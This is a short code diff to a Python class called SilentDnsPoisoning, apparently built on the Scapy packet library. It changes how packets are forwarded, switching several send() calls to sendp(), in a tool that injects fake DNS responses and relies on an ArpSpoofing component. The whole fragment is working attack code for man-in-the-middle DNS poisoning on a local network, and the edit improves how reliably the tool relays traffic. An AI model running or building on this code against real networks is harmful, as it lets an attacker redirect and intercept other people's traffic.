@@ -53,10 +53,10 @@ class SilentDnsPoisoning:
                                         print("Fake packet sent")
                                 if linkPresent == False:
                                     # No link match -> resend the DNS request to its true receiver
-                                    send(pkt, iface=interface)
+                                    sendp(pkt, iface=interface)
                             else:
                                 # This is not a DNS request -> resend the packet to its true receiver
-                                send(pkt, iface=interface)
+                                sendp(pkt, iface=interface)
                         else:
                             # Packet doesn't have DNS layer -> resend the packet to its true receiver
                             sendp(pkt, iface=interface)
@@ -72,10 +72,7 @@ class SilentDnsPoisoning:
                             found = True
                             break
                     if found:
-                        if pkt.haslayer(DNS):
-                            send(pkt, iface=interface)
-                        else:
-                            sendp(pkt, iface=interface)
+                        sendp(pkt, iface=interface)
         arpSpoofing = ArpSpoofing(self.interface)
         try:
             print("before thread")
